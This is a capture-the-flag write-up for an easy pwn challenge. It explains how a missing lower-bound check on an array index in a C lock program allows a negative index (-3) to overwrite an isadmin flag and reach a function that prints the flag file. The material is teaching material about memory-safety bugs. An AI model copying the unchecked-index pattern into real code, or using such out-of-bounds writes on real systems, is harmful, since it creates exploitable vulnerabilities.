# COOL AHH LOCK
# Pwn(Easy)

## Looking at the program

I started by checking the challenge files and running the program:

```bash
cd ~/Downloads/cool_ahh_lock
ls -l
./cool_ahh_lock
```

The program asks me to set numbers in a four-digit lock. I looked at the source code to understand how it worked.

The important variables were:

```c
int isadmin = 0;
int lock[4] = {0, 0, 0, 0};
int password[4] = {0, 0, 0, 0};
```

The password is generated randomly, so guessing it would be difficult. But I noticed that the program lets the user choose which position in `lock` to change:

```c
scanf("%d", &idx);

if (idx > 4) {
    puts("theres only 4 numbers to be set :/ try again");
    continue;
}

scanf("%d", &lock[idx - 1]);
```

The program checks that `idx` is not greater than 4, but it never checks that `idx` is at least 1. That means a negative index can access memory outside the `lock` array.

## Finding what to overwrite

The program only opens the secret chamber when `isadmin` is non-zero:

```c
if (isadmin) {
    theSecretChamber();
}
```

That function reads the flag:

```c
void theSecretChamber() {
    system("cat flag.txt");
}
```

So I wanted to use the out-of-bounds write to change `isadmin` from `0` to `1`.

I compiled the source with debugging information and used GDB to check where `isadmin` and `lock` were in memory:

```bash
gcc -g -O0 cool_ahh_lock.c -o cool_ahh_lock_debug
gdb ./cool_ahh_lock_debug
```

Inside GDB, I ran:

```gdb
p &isadmin
p &lock
```

The memory layout showed that choosing index `-3` makes the program write to `lock[-4]`, which reaches `isadmin` in this build.

## Exploit

When the program asked which position to change, I entered `-3`. Then I entered `1` as the value to write. Finally, I entered `n` when asked whether to continue:

```text
-3
1
n
```

The program calculates the array position as `idx - 1`, so `-3` becomes `-4`. This causes the write `lock[-4] = 1`, changing `isadmin` to a non-zero value. The program then opens the secret chamber and prints the flag.

## Commands used

```bash
cd ~/Downloads/cool_ahh_lock
ls -l
./cool_ahh_lock
gcc -g -O0 cool_ahh_lock.c -o cool_ahh_lock_debug
gdb ./cool_ahh_lock_debug
```

Commands entered inside GDB:

```gdb
p &isadmin
p &lock
```

## Vulnerability

The bug is an out-of-bounds write caused by incomplete bounds checking. The program rejects indexes greater than 4, but does not reject indexes less than 1. A negative index can therefore write outside the `lock` array and overwrite nearby memory.

## Exploit input

```text
-3
1
n
```